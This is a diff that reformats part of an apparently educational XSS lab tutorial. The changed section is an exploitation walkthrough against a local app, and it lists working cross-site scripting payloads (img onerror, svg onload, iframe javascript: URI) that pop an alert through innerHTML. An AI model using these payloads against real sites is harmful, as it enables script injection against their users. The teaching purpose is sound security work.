@@ -137,26 +137,33 @@ That "load → render" cycle is exactly where the vulnerability lives. Keep that
 
 ---
 
-💥 Exploitation Walkthrough
-All payloads below target your own localhost. They are teaching examples, not
-tools for use against systems you don't own.
+## 💥 Exploitation Walkthrough
 
-Step 1 — Confirm Basic Execution
-Important nuance: Modern browsers do not execute <script> tags inserted via innerHTML. So the "classic" payload below will not fire in this app:
+> All payloads below target your own localhost. They are teaching examples, not
+> tools for use against systems you don't own.
 
-html
+### Step 1 — Confirm Basic Execution
+Important nuance: Modern browsers do not execute `<script>` tags inserted via `innerHTML`. So the "classic" payload below will not fire in this app:
+
+```
 <script>alert('XSS')</script>   <!-- does NOT execute via innerHTML -->
+```
+
 Instead, use a payload that executes when the browser parses it through innerHTML. Try each of these:
 
-Payload 1 — Image error handler (most reliable):
+#### Payload 1 — Image error handler (most reliable):
 
-html
+```
 <img src=x onerror="alert('XSS')">
-Payload 2 — SVG load event:
+```
 
-html
+#### Payload 2 — SVG load event:
+
+```
 <svg onload="alert('XSS')">
-Payload 3 — Iframe with javascript: URI:
+```
+
+#### Payload 3 — Iframe with javascript: URI:
 
 html
 <iframe src="javascript:alert('XSS')"></iframe>
